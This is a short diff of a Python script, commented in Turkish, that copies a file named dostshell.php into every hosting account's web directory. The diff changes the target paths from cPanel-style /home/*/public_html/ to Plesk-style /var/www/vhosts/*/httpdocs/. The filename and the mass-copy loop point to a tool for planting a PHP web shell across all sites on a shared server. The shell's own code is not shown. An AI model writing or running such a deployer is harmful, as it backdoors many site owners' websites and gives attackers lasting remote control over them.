@@ -2,10 +2,10 @@ import glob
 import shutil
 
 # Kaynak dosyanın yolu
-source_file = '/home/dostshell.php'
+source_file = '/var/www/vhosts/dostshell.php'
 
 # Hedef dizinleri bul ve dosyayı kopyala
-for target_dir in glob.glob('/home/*/public_html/'):
+for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
     try:
         shutil.copy(source_file, target_dir)
         print(f"{source_file} kopyalandı -> {target_dir}")
